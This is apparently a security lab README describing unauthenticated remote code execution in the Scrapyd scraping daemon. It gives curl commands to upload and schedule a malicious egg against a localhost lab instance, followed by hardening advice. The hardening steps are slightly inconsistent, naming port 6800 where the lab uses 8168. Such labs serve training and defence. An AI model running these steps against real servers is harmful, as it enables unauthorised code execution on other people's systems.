# Scrapyd Unauthenticated Web Scraping Daemon Remote Code Execution

## Overview

Scrapyd is a service for deploying and running Scrapy spiders across distributed clusters. By default, Scrapyd runs without authentication enabled. The REST API permits users to upload and schedule Python packages (.egg files) via the addversion.json and schedule.json endpoints. Attackers can upload an egg containing arbitrary Python code executed immediately upon job scheduling.

- **Service Access**: `http://localhost:8168/`
- **Default Credentials**: `Unauthenticated REST API`
- **Docker Shortcut**: `./lab start scrapyd-unauth-rce`
- **Container Name**: `cyberlab_industry_scrapyd_rce`
- **RAM Footprint**: ~100M

---

## Exploitation Walkthrough

### 1. Inspect Scrapyd Dashboard and Projects

```bash
curl -i http://localhost:8168/listprojects.json
```

### 2. Deploy Malicious Scrapy Egg via addversion.json

```bash
curl -i -X POST 'http://localhost:8168/addversion.json' \
  -F 'project=pwn' \
  -F 'version=r1' \
  -F 'egg=@evil_spider.egg'
```

### 3. Schedule Execution of Spider

```bash
curl -i -X POST 'http://localhost:8168/schedule.json' -d 'project=pwn&spider=evil'
```

### 4. Verify Command Execution

```bash
docker exec -it cyberlab_industry_scrapyd_rce ls -la /tmp/pwned_scrapyd
```

---

## Defensive Remediation & Hardening

1. **Enable HTTP basic authentication in scrapyd.conf**:
   Enable HTTP basic authentication in scrapyd.conf: username and password.
2. Restrict access to port 6800 using firewalls or VPNs.
3. Run Scrapyd within low-privilege isolated containers.

---

## Video Walkthroughs & Technical References

- [2024 Guide: Hacking APIs](https://www.youtube.com/watch?v=k5HZI6CfHw4)
- [Scrapyd Security Configuration Documentation](https://scrapyd.readthedocs.io/en/latest/config.html)
- [Vulhub Scrapyd Environment](https://vulhub.org/#/environments/scrapyd/unacc/)
